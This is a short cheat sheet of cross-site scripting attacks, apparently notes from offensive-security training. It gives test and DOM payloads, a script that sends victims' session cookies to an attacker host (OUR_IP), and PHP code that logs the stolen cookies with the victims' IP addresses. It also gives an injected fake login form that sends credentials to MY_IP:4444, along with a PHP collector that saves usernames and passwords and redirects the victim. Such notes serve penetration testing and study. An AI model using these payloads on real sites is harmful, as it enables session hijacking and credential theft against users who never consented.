#### Reminder to URL encode!

### Testing
```
<script>alert(window.origin)</script>
<script>print()</script>
><plaintext>
```
###### DOM
```
<img src="" onerror=alert(window.origin)>
#"><img src=/ onerror=alert(2)>
```
### Bypass filter

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads

### Session hijacking
###### Getting the cookie
```
document.cookie
```
###### Example
###### We can add the following script into our own hosted .js file as well
```
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
```
###### To call it we use the following XSS
```
<script src=http://OUR_IP/script.js></script>
```
###### Store cookies index.php
```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
### Login form phishing
###### Code
```
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
###### Cleanup
```
document.getElementById('ID_HERE').remove();
```
###### Example
```
'/><script>document.write('<h3>Please login to continue</h3><form action=http://MY_IP:4444><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('ID_HERE').remove();</script><!--
```
###### Redirection index.php
```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/To_Redirect_Them/index.php");
    fclose($file);
    exit();
}
```
